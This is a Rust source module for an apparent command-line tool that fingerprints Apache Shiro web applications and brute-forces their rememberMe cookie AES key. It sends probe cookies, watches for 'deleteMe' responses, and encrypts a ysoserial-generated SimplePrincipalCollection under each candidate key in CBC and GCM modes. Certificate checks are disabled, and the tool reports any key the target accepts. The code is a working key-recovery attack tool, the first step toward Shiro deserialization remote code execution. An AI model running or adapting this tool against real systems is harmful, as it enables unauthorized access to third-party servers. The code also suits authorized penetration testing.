pub mod cli;

use anyhow::anyhow;
use cli::EmoArgs;
use encoding_rs::{Encoding, UTF_8};
use mime::Mime;
use once_cell::sync::Lazy;
use openssl::base64::{decode_block, encode_block};
use openssl::symm::{encrypt, Cipher};
use prettytable::{color, Attr, Cell, Row, Table};
use reqwest::{header, Proxy, Response};
use reqwest::{Method, Url};
use select::document::Document;
use select::predicate::Name;
use std::collections::{HashMap, HashSet};
use std::fs::File;
use std::io;
use std::io::BufRead;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

#[derive(Debug)]
pub struct RawData {
    pub url: Url,
    pub headers: header::HeaderMap,
    pub status_code: reqwest::StatusCode,
    pub text: String,
}

pub static EMO_ARGS: Lazy<EmoArgs> = Lazy::new(|| -> EmoArgs { EmoArgs::new() });

/// 发送请求，并带上apache-shiro的请求头
async fn send_requests(
    url: &Url,
    method: Method,
    mut headers: header::HeaderMap,
) -> anyhow::Result<Response> {
    let ua = "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0";
    headers.insert(header::USER_AGENT, header::HeaderValue::from_static(ua));
    let client = reqwest::Client::builder()
        .pool_max_idle_per_host(0)
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .default_headers(headers.clone())
        .timeout(Duration::new(EMO_ARGS.timeout, 0));
    let config_proxy = EMO_ARGS.proxy.clone();
    let proxy_obj = Proxy::custom(move |_| config_proxy.clone());
    return Ok(client
        .proxy(proxy_obj)
        .build()?
        .request(method, url.as_ref())
        .send()
        .await?);
}

pub async fn index_fetch(url_str: &str, method: Method) -> anyhow::Result<Arc<RawData>> {
    let schemes: [&str; 2] = ["https://", "http://"];
    for scheme in schemes {
        //最大重定向跳转次数
        let mut full_url = url_str.to_string();
        if !url_str.to_lowercase().starts_with("http://")
            && !url_str.to_lowercase().starts_with("https://")
        {
            full_url = format!("{}{}", scheme, url_str);
        }
        let url = Url::parse(&full_url)?;
        let mut headers = header::HeaderMap::new();
        headers.insert(
            header::COOKIE,
            header::HeaderValue::from_static("rememberMe=admin;rememberMe-K=admin"),
        );
        if let Ok(res) = send_requests(&url, method.clone(), headers).await {
            if let Ok(raw_data) = fetch_raw_data(res).await {
                return Ok(raw_data);
            };
        };
    }
    Err(anyhow!("HTTP ERR"))
}

async fn fetch_raw_data(res: Response) -> anyhow::Result<Arc<RawData>> {
    let status_code = res.status();
    let headers = res.headers().clone();
    let base_url = res.url().clone();
    let text_byte = res.bytes().await.unwrap_or_default();
    let (text, _) = get_default_encoding(&text_byte, headers.clone());
    // 在请求头和正文里匹配下一跳URL
    let raw_data = Arc::new(RawData {
        url: base_url,
        headers,
        status_code,
        text: text.to_lowercase(),
    });
    Ok(raw_data)
}

/// 获取编码并且尝试解码，返回解码后字符串和是否解码成功
fn get_default_encoding(byte: &[u8], headers: header::HeaderMap) -> (String, bool) {
    let (html, _, _) = UTF_8.decode(byte);
    let default_encoding = get_charset_from_html(&html);
    let content_type = headers
        .get(header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .and_then(|value| value.parse::<Mime>().ok());
    let header_encoding = content_type
        .as_ref()
        .and_then(|mime| mime.get_param("charset").map(|charset| charset.as_str()))
        .unwrap_or(&default_encoding);
    for encoding_name in &[header_encoding, &default_encoding] {
        let encoding = Encoding::for_label(encoding_name.as_bytes()).unwrap_or(UTF_8);
        let (text, _, is_errors) = encoding.decode(byte);
        if !is_errors {
            return (text.to_string(), false);
        }
    }
    if let Ok(text) = String::from_utf8(byte.to_vec()) {
        return (text, false);
    }
    return (String::from_utf8_lossy(byte).to_string(), true);
}

/// reqwest的内部只有从请求头提取编码，这里需要在html里再提取
fn get_charset_from_html(text: &str) -> String {
    for metas in Document::from(text).find(Name("meta")) {
        if let Some(charset) = metas.attr("charset") {
            return charset.to_lowercase();
        }
    }
    String::from("utf-8")
}

pub fn make_remember_me(key: &str, cipher: Cipher, data: &[u8]) -> String {
    let mut iv = uuid::Uuid::new_v4().as_bytes().to_vec();
    let key = decode_block(key).unwrap_or_default();
    let ciphertext = encrypt(cipher, &key, Some(&iv), data);
    iv.extend(ciphertext.unwrap_or_default());
    encode_block(&iv)
}

/// 单个目标的shiro校验和key爆破
#[derive(Debug, Clone)]
pub struct ShiroVerify {
    pub target: Option<Url>,
    verify: bool,
    mode: String,
    method: Method,
    key: Option<String>,
}

impl ShiroVerify {
    pub async fn new(target: String) -> Self {
        let mut sv = ShiroVerify {
            target: None,
            verify: false,
            mode: "".to_string(),
            method: Method::GET,
            key: None,
        };
        for m in vec![Method::GET, Method::POST] {
            sv.method = m.clone();
            if let Ok(rd) = index_fetch(&target, m).await {
                sv.target = Some(rd.url.clone());
                if let Some(cookie) = rd.headers.get(header::SET_COOKIE) {
                    sv.verify = cookie.to_str().unwrap_or_default().contains("=deleteMe");
                    return sv;
                }
            }
        }
        sv
    }
    pub async fn burst_key(&mut self) {
        let mut keys = HashSet::new();
        keys.insert(EMO_ARGS.key.clone());
        if let Some(file_path) = &EMO_ARGS.keys {
            keys.extend(read_file_to_target(file_path));
        }
        if self.target.is_none() || !self.verify {
            return;
        }
        let target = self.target.as_ref().unwrap();
        let shiro_spc = ysoserial_rs::get_shiro_simple_principal_collection();
        let ciphers = HashMap::from([
            ("CBC", Cipher::aes_128_cbc()),
            ("GCM", Cipher::aes_128_gcm()),
        ]);
        for (mode, cipher) in ciphers {
            if let Some(m) = &EMO_ARGS.mode {
                if mode != m {
                    continue;
                }
            }
            self.mode = mode.to_string();
            for key in &keys {
                let h = make_remember_me(key, cipher, &shiro_spc);
                let cookie = format!("rememberMe={}", h);
                let mut headers = header::HeaderMap::new();
                headers.insert(
                    header::COOKIE,
                    header::HeaderValue::from_str(&cookie)
                        .unwrap_or(header::HeaderValue::from_static("")),
                );
                if let Ok(res) = send_requests(target, self.method.clone(), headers).await {
                    if let Ok(raw_data) = fetch_raw_data(res).await {
                        let cookie = raw_data.headers.get(header::SET_COOKIE);
                        match cookie {
                            Some(c) => {
                                if !c.to_str().unwrap_or_default().contains("=deleteMe") {
                                    self.key = Some(key.to_string());
                                    return;
                                }
                            }
                            None => {
                                self.key = Some(key.to_string());
                                return;
                            }
                        };
                    };
                };
            }
        }
    }
}

pub fn print_results_and_save(results: Vec<ShiroVerify>) {
    let mut table = Table::new();
    let headers = vec![
        Cell::new("url"),
        Cell::new("method"),
        Cell::new("verify"),
        Cell::new("mode"),
        Cell::new("key"),
    ];
    table.set_titles(Row::new(headers.clone()));
    for res in &results {
        let mut verify_color = Attr::ForegroundColor(color::RED);
        if res.verify {
            verify_color = Attr::ForegroundColor(color::GREEN);
        }
        let mut t = String::new();
        if let Some(target) = res.target.clone() {
            t = target.as_str().to_string();
        };
        let rows = vec![
            Cell::new(&t),
            Cell::new(res.method.as_str()),
            Cell::new(&res.verify.to_string()).with_style(verify_color),
            Cell::new(&res.mode),
            Cell::new(res.key.clone().unwrap_or_default().as_str()),
        ];
        table.add_row(Row::new(rows));
    }
    if let Some(csv_path) = &EMO_ARGS.csv {
        let out = File::create(csv_path).expect("Failed to create file");
        table.to_csv(out).expect("Failed to save file");
    }
    let mut table = Table::new();
    table.set_titles(Row::new(headers));
    for res in &results {
        let mut verify_color = Attr::ForegroundColor(color::RED);
        if res.verify {
            verify_color = Attr::ForegroundColor(color::GREEN);
        }
        let mut t = String::new();
        if let Some(target) = res.target.clone() {
            t = target.as_str().to_string();
        };
        let rows = vec![
            Cell::new(&t),
            Cell::new(res.method.as_str()),
            Cell::new(&res.verify.to_string()).with_style(verify_color),
            Cell::new(&res.mode),
            Cell::new(&res.key.clone().unwrap_or_default()),
        ];
        table.add_row(Row::new(rows));
    }
    if !table.is_empty() {
        table.printstd();
    }
}

pub fn read_file_to_target(file_path: &str) -> HashSet<String> {
    if let Ok(lines) = read_lines(file_path) {
        let target_list: Vec<String> = lines.filter_map(Result::ok).collect();
        return HashSet::from_iter(target_list);
    }
    HashSet::from_iter([])
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
    where
        P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
